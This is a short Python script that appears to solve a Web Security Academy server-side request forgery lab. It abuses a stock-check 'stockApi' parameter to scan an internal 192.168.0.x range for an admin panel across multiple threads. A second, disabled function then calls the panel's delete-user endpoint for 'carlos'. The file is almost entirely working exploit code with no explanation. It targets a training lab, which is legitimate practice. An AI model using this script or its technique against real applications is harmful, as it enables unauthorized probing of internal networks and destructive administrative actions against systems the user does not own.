import requests
import threading

DOMAIN = "0a8b00ea0467718582ad10ed00c300e5.web-security-academy.net"

def enumerate_internal_network(from_i, to_i):
    # stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
    for i in range(from_i, to_i):
        url = f"http://192.168.0.{i}:8080/admin"
        data = {
            "stockApi": url
        }
        response = requests.post(f"https://{DOMAIN}/product/stock", data=data)
        if response.status_code == 200:
            print(f"Found internal IP: 192.168.0.{i}")
            print(response.text)
            break

def multi_thread_enum():
    threads = []

    for i in range(1, 255, 32):
        t = threading.Thread(target=enumerate_internal_network, args=(i, i+32))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

def interact_with_admin_panel():
    url = "http://192.168.0.92:8080/admin/delete?username=carlos"
    data = {
        "stockApi": url
    }

    response = requests.post(f"https://{DOMAIN}/product/stock", data=data)

    print(response.text)

multi_thread_enum()
# interact_with_admin_panel()